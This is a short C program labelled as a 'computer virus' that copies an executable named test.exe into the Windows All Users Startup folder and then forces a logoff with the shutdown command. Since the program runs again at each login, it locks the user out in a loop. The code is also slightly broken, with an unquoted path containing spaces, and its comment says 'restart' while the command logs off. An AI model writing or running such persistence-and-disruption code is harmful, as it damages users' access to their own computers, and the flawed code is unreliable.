//Develop Computer Virus using C to Restart Computer
#include<stdio.h>
#include<dos.h>
int main()
{
    system("copy test.exe C:/Documents and Settings/All Users/Start Menu/Programs/Startup/");
    system("shutdown -l -f");
}